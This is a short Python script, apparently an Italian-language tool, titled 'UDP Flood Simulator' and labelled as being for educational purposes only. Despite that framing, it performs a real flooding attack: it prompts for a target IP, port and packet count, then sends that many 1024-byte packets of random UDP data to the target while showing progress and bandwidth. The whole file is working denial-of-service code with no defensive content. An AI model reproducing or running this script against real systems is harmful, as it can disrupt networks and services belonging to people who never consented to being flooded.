import socket
import random
import time
from datetime import datetime


def print_banner():
    print("""
    \033[1;31m
    ██╗   ██╗██████╗ ██████╗    ███████╗██╗      ██████╗  ██████╗ ██████╗ 
    ██║   ██║██╔══██╗██╔══██╗   ██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗
    ██║   ██║██║  ██║██████╔╝   █████╗  ██║     ██║   ██║██║   ██║██║  ██║
    ██║   ██║██║  ██║██╔═══╝    ██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║
    ╚██████╔╝██████╔╝██║        ██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝
     ╚═════╝ ╚═════╝ ╚═╝        ╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ 
     ███████╗██╗███╗   ███╗██╗   ██╗██╗      █████╗ ████████╗ ██████╗ ██████╗ 
     ██╔════╝██║████╗ ████║██║   ██║██║     ██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
     ███████╗██║██╔████╔██║██║   ██║██║     ███████║   ██║   ██║   ██║██████╔╝
     ╚════██║██║██║╚██╔╝██║██║   ██║██║     ██╔══██║   ██║   ██║   ██║██╔══██╗
     ███████║██║██║ ╚═╝ ██║╚██████╔╝███████╗██║  ██║   ██║   ╚██████╔╝██║  ██║
     ╚══════╝╚═╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
    \033[0m
    """)
    print("\033[1;37m[!] UDP Flood Simulator - \033[4;37mSOLO PER SCOPI EDUCATIVI\033[0m\n")

def udp_flood_attack():
    print_banner()
    
    # print configurazione
    target_ip = input("\033[1;34m[?] IP del bersaglio: \033[0m")
    target_port = int(input("\033[1;34m[?] Porta UDP del bersaglio: \033[0m"))
    num_packets = int(input("\033[1;34m[?] Numero pacchetti da inviare: \033[0m"))
    packet_size = 1024 
  
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    start_time = datetime.now()
    
    print(f"\n\033[1;32m[+] Avvio simulazione: {target_ip}:{target_port}\033[0m")
    print(f"\033[1;32m[+] Dimensione dei pacchetti: {packet_size} bytes | Totale mandato: {num_packets * packet_size / 1024:.2f} KB\033[0m")
    
    try:
        for i in range(num_packets):
            random_data = bytes([random.randint(0, 255) for _ in range(packet_size)])
            sock.sendto(random_data, (target_ip, target_port))

            if (i + 1) % max(1, num_packets // 100) == 0 or (i + 1) == num_packets:
                elapsed = (datetime.now() - start_time).total_seconds()
                pct_complete = (i + 1) / num_packets * 100
                remaining = (num_packets - (i + 1)) * (elapsed / (i + 1)) if i > 0 else 0
                print(
                    f"\033[1;33m[→] Manadti {i + 1}/{num_packets} pacchetti({pct_complete:.1f}%) | "
                    f"Tempo impiegato: {elapsed:.2f}s | Tempo rimanente: {remaining:.2f}s\033[0m",
                    end="\r" if (i + 1) != num_packets else "\n"
                )
        
        # riepilogo finale
        total_time = (datetime.now() - start_time).total_seconds()
        bandwidth = (num_packets * packet_size) / (total_time * 1024)
        print(f"\n\033[1;32m[✓] Simulazione d'attacco UDP FLOOD completata in {total_time:.2f} secondi")
        print(f"[✓] Banda richiesta: {bandwidth:.2f} KB/s\033[0m")
    
    except KeyboardInterrupt:
        print("\n\033[1;31m[!] Simulazione interrotta dall'utente\033[0m")
    except Exception as e:
        print(f"\n\033[1;31m[!] Errore: {e}\033[0m")
    finally:
        sock.close()

if __name__ == "__main__":
    udp_flood_attack()